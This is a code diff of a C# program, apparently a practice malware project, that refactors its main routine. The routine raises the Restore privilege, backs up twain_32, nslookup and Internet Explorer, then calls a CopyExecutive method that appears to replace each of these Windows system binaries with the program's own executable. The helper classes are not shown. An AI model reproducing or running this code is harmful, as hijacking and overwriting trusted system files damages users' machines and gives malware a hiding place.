@@ -14,18 +14,26 @@ namespace voileapp
 
         static void Main(string[] args)
         {
-            // Some system paths taken from environment variables
+            // Some system paths are taken from environment variables
             String sysRoot = Environment.ExpandEnvironmentVariables("%SystemRoot%");
             String sysDir = Environment.SystemDirectory;
             String programFilesDir = Environment.ExpandEnvironmentVariables("%ProgramFiles%");
             
-            // Now all the patchs are composed into the absolute form via StringBuilder
-            StringBuilder pathToTwain32 = new StringBuilder(sysRoot).Append("\\").Append(TWAIN32_NAME);
-            StringBuilder pathToNslookup = new StringBuilder(sysDir).Append("\\").Append(NSLOOKUP_NAME);
-            StringBuilder pathToIexplore = new StringBuilder(programFilesDir).Append("\\").Append(IEXPLORE_DIR)
-                .Append("\\").Append(IEXPLORE_NAME);
+            // Now all the paths are composed into the absolute form by StringBuilder
+            
+            StringBuilder pathToTwain32 = new StringBuilder(sysRoot)
+                .Append("\\")
+                .Append(TWAIN32_NAME);
+            StringBuilder pathToNslookup = new StringBuilder(sysDir)
+                .Append("\\")
+                .Append(NSLOOKUP_NAME);
+            StringBuilder pathToIexplore = new StringBuilder(programFilesDir)
+                .Append("\\")
+                .Append(IEXPLORE_DIR)
+                .Append("\\")
+                .Append(IEXPLORE_NAME);
 
-            // Sometimes it requires 'Restore' privilege for the user to manipulate on certain files
+            // Sometimes it requires 'Restore' privilege for the user to manipulate with certain files
             Privileges.GiveRestorePrivilege();
 
             /**
@@ -34,26 +42,22 @@ namespace voileapp
              * ...deleting the original ones
              * Beware, the automatical backup restore isn't included
              * 
-             * The exceptions handling is sparse due to the nature of the ultimate program's predestination
+             * The exceptions handling is sparse due to the nature of the program's ultimate predestination
              * It's practice.
              **/
-            try
-            {
-                // It's possible to specify the name of the saved file
-                Backup.MakeBackup(pathToTwain32.ToString(), TWAIN32_NAME);
-                Backup.MakeBackup(pathToNslookup.ToString(), NSLOOKUP_NAME);
-                Backup.MakeBackup(pathToIexplore.ToString(), IEXPLORE_NAME);
 
-                FileCopy.CopyExecutive(pathToTwain32.ToString());
-                FileCopy.CopyExecutive(pathToNslookup.ToString());
-                FileCopy.CopyExecutive(pathToIexplore.ToString());
-            } catch (UnauthorizedAccessException e)
-            {
-                // There's only one exception's explicit handling
-                Console.WriteLine("Unauthorized access!");
-                Console.WriteLine(e.StackTrace);
-            }
+            FileCopy twain32dll = new FileCopy(pathToTwain32.ToString());
+            twain32dll.MakeBackup();
+            twain32dll.CopyExecutive();
 
+            FileCopy nslookup = new FileCopy(pathToNslookup.ToString());
+            nslookup.MakeBackup();
+            nslookup.CopyExecutive();
+
+            FileCopy iexplore = new FileCopy(pathToIexplore.ToString());
+            iexplore.MakeBackup();
+            iexplore.CopyExecutive();
+            
         }
     }
 }
